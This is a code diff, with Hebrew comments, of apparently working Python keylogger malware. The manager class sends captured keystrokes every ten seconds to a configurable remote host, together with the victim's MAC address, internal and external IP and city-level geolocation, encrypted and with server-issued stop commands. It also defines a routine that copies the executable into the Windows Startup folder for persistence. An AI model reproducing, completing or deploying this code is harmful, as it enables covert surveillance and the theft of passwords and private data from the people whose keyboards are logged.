@@ -1,41 +1,62 @@
+import json
 from keylogger_service import KeyloggerService
 from encryptor import Encryptor
-from file_wirter import FileWriter
 from network_writer import NetworkWriter
 from getmac import get_mac_address
 import requests
 import socket
 import time
-
+import os
+import shutil
 
 class KeyloggerManager:
 
-    def __init__(self):
+    def __init__(self,encryptor:Encryptor,writer):
         self.active = True
         self.keylogger = KeyloggerService()
-        self.encryptor = Encryptor()
-        self.file_writer = FileWriter()
-        self.network_writer = NetworkWriter()
+        self.encryptor = encryptor
+        self.writer = writer
+        self.wrapper = self.wrapper_fill()
+        # self.copy_file()
         self.main()
 
+
+    def wrapper_fill(self):
+        # קבלת נתונים על המחשב
+        mac_name = self.get_mac_details()
+        internal_ip, external_ip = self.get_ip_details()
+        location = self.get_computer_location()
+        wrapper = {"mac_name": mac_name,
+                   "internal_ip": internal_ip,
+                   "external_ip": external_ip,
+                   "location": location,
+                   "data": {}}
+        return wrapper
+
     def main(self) ->None:
+
         while self.active:
             try:
+                #הזמן בין כל קבלת נתונים
                 time.sleep(10)
+                #קבלת הנתונים מהkeyloggerservice
                 data = self.keylogger.data
-                # אולי עדיף להצפין גם את הכתובת מאק
-                mac_name = self.get_mac_details()
-                internal_ip, external_ip = self.get_ip_details()
-                location = self.get_computer_location()
-                wrapper = {"mac_name" : mac_name,
-                           "internal_ip" : internal_ip,
-                           "external_ip" : external_ip,
-                           "location" : location,
-                           "data" : data}
-                wrapper = self.encryptor.xor(wrapper)
-                if self.network_writer.send_data(wrapper):
+                #הכנסת הנתונים לwrapper
+                self.wrapper["data"].update(data)
+                # הצפנת הנתונים
+                wrapper = self.encryptor.encrypt(self.wrapper)
+                #שליחת הנתונים וקבלת תשובה
+                response = self.writer.send_data(wrapper)
+                #בדיקת סוג התשובה
+                if response == "stop": #קבלת פקודה לעצור את ההקלטות
                     self.stop()
+                elif response == "error": #אם אירעה שגיאה יש להמשיך לשמור את המידע בwrapper עד להצלחת השליחה
+                    pass
+                else: #נשלח בהצלחה יש לנקות את המידע בwrraper
+                    self.wrapper["data"] = {}
+
             except Exception as e:
+                print(e)
                 pass
 
 
@@ -46,24 +67,52 @@ class KeyloggerManager:
     @staticmethod
     def get_ip_details() ->tuple:
         internal_ip = socket.gethostbyname(socket.gethostname())
-        external_ip = requests.get("https://api64.ipify.org?format=json").json()["ip"]
+        try: external_ip = requests.get("https://api64.ipify.org?format=json",timeout=5).json()["ip"]
+        except: external_ip = "Unknown"
         return internal_ip,external_ip
 
     def get_computer_location(self) -> str:
         url = "http://ip-api.com/json/"
-        response = requests.get(url)
-        data = response.json()
+        try:
+            response = requests.get(url)
+            data = response.json()
 
-        if data["status"] == "success":
-            return f"Country: {data['country']} Region: {data['regionName']} City:{data['city']}"
-        else:
-            return "Not found location"
+            if data["status"] == "success":
+                return f"Country: {data['country']} Region: {data['regionName']} City:{data['city']}"
+            else:
+                return "Not found location"
+        except:
+            return "Location service unavailable"
 
     def stop(self) -> None:
         self.active = False
 
+    @staticmethod
+    def copy_file():
+        source = "keylogger.exe" #יצירת שם קובץ להעתקה
+        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup') #יצירת נתיב לתיקיית התחל של המחשב
+        destination = os.path.join(startup_dir, os.path.basename(source)) #יצירת נתיב ליצרית קובץ
+
+        try:
+            if not os.path.exists(destination):
+                shutil.copy2(source, destination) #העתקת הקובץ לתפריט ההתחלה
+                os.startfile(destination) #הפעלת הקובץ מתפריט ההתחלה
+                os._exit(0) #כיבוי הקובץ הקיים כדי שלא יהיה כפול
+        except:
+            pass
+
+
 if __name__ == '__main__':
-    key = KeyloggerManager()
+    #קבלת הנתיב רשת והמפתח להצפנה
+    with open("../config.json",'r')as file:
+        data = json.load(file)
+        host = data["host"]
+        key = data["key"]
+
+    encryptor = Encryptor(key)
+    writer = NetworkWriter(host)
+
+    keylogger = KeyloggerManager(encryptor,writer)
 
 
 
